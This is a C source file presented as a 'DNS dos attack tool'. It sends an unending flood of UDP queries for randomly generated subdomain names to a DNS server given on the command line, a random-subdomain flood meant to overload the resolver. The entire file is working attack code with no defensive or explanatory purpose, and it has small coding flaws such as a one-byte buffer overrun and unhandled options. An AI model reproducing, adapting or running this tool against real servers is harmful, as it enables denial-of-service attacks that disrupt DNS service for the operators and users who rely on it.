/*****************++++*****************
 * DNS fuck      : DNS dos attack tool 
 * Creation date : 2012/12/14     
 * Written by    : Kousuke Simofuji    
 **************************************/
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<time.h>
#include<sys/socket.h>
#include<arpa/inet.h>
#include<netinet/in.h>
#include<unistd.h>

#define T_A 1 //Ipv4 address
#define T_NS 2 //Nameserver
#define T_CNAME 5 // canonical name
#define T_SOA 6 /* start of authority zone */
#define T_PTR 12 /* domain name pointer */
#define T_MX 15 //Mail server

//prototype 
void dns_attack (unsigned char*, int);
void ChangetoDnsNameFormat (unsigned char*,unsigned char*);

//DNS header structure
struct DNS_HEADER
{
	unsigned short id; // identification number

	unsigned char rd :1; // recursion desired
	unsigned char tc :1; // truncated message
	unsigned char aa :1; // authoritive answer
	unsigned char opcode :4; // purpose of message
	unsigned char qr :1; // query/response flag

	unsigned char rcode :4; // response code
	unsigned char cd :1; // checking disabled
	unsigned char ad :1; // authenticated data
	unsigned char z :1; // its z! reserved
	unsigned char ra :1; // recursion available

	unsigned short q_count; // number of question entries
	unsigned short ans_count; // number of answer entries
    unsigned short auth_count; // number of authority entries
	unsigned short add_count; // number of resource entries
};

//Constant sized fields of query structure
struct QUESTION
{
	unsigned short qtype;
	unsigned short qclass;
};

//Constant sized fields of the resource record structure
#pragma pack(push, 1)
struct R_DATA
{
	unsigned short type;
	unsigned short _class;
	unsigned int ttl;
	unsigned short data_len;
};
#pragma pack(pop)

//Pointers to resource record contents
struct RES_RECORD
{
	unsigned char *name;
	struct R_DATA *resource;
	unsigned char *rdata;
};

//Structure of a Query
typedef struct
{
	unsigned char *name;
	struct QUESTION *ques;
} QUERY;


int main( int argc , char *argv[])
{
    int opts;
    unsigned char dns_server[100];
	unsigned char hostname[100];

    srand((unsigned)time(NULL)); 

    //Parse options
    while((opts=getopt(argc, argv, "t:f:n:")) != -1){
       switch(opts){
          case 't':
             strcpy(dns_server, optarg);
             break;
          default:
             fprintf(stderr, "Unknow option %c\n", opts);
             exit(0);
             break;
       }
    }

    //Now get the ip of this hostname , A record
    dns_attack(dns_server, T_A);
    return 0;
}

void dns_attack(unsigned char *dns_server, int query_type) 
{
	unsigned char buf[65536],*qname,*reader;
    int sock;
	struct RES_RECORD answers[20],auth[20],addit[20]; //the replies from the DNS server
	struct sockaddr_in dest;

	struct DNS_HEADER *dns = NULL;
	struct QUESTION *qinfo = NULL;
    int count=0;

   	sock = socket(AF_INET , SOCK_DGRAM , IPPROTO_UDP); //UDP packet for DNS queries

	dest.sin_family = AF_INET;
	dest.sin_port = htons(53);
	dest.sin_addr.s_addr = inet_addr(dns_server); //dns servers

	//Set the DNS structure to standard queries
	dns = (struct DNS_HEADER *)&buf;

	dns->id = (unsigned short) htons(getpid());
	dns->qr = 0; //This is a query
	dns->opcode = 0; //This is a standard query
	dns->aa = 0; //Not Authoritative
	dns->tc = 0; //This message is not truncated
	dns->rd = 1; //Recursion Desired
	dns->ra = 0; //Recursion not available! hey we dont have it (lol)
	dns->z = 0;
	dns->ad = 0;
	dns->cd = 0;
	dns->rcode = 0;
	dns->q_count = htons(1); //we have only 1 question
	dns->ans_count = 0;
	dns->auth_count = 0;
	dns->add_count = 0;

    for(;;){
       //point to the query portion
       qname =(unsigned char*)&buf[sizeof(struct DNS_HEADER)];

       char host[30];
       char sp=sizeof(host) / 6;
       int i;

       for(i=0; i<sizeof(host); i++){
          if(i % sp){
             host[i]= 'a' + (rand() % 26);
          }else{
             host[i] = '.';
          }
       }
       host[0] = 'a' + (rand() % 26);
       host[i] = '\0';

       //translate hostname to dns format
       ChangetoDnsNameFormat(qname , host);
       qinfo =(struct QUESTION*)&buf[sizeof(struct DNS_HEADER) + (strlen((const char*)qname) + 1)]; //fill it

       qinfo->qtype = htons( query_type ); //type of the query , A , MX , CNAME , NS etc
       qinfo->qclass = htons(1); //its internet (lol)

       printf("SEND QUERY : %s\n", host);
       if( sendto(sock,(char*)buf,sizeof(struct DNS_HEADER) + (strlen((const char*)qname)+1) + sizeof(struct QUESTION),0,(struct sockaddr*)&dest,sizeof(dest)) < 0)
       {
          perror("sendto failed");
       }
   }
}

/*
 * This will convert www.google.com to 3www6google3com got it :)
 */
void ChangetoDnsNameFormat(unsigned char* dns,unsigned char* host) 
{
    int lock = 0 , i;
    strcat((char*)host,".");
    
    for(i = 0 ; i < strlen((char*)host) ; i++) 
    {
        if(host[i]=='.') 
        {
            *dns++ = i-lock;
            for(;lock<i;lock++) 
            {
                *dns++=host[lock];
            }
            lock++; //or lock=i+1;
        }
    }
    *dns++='\0';
}


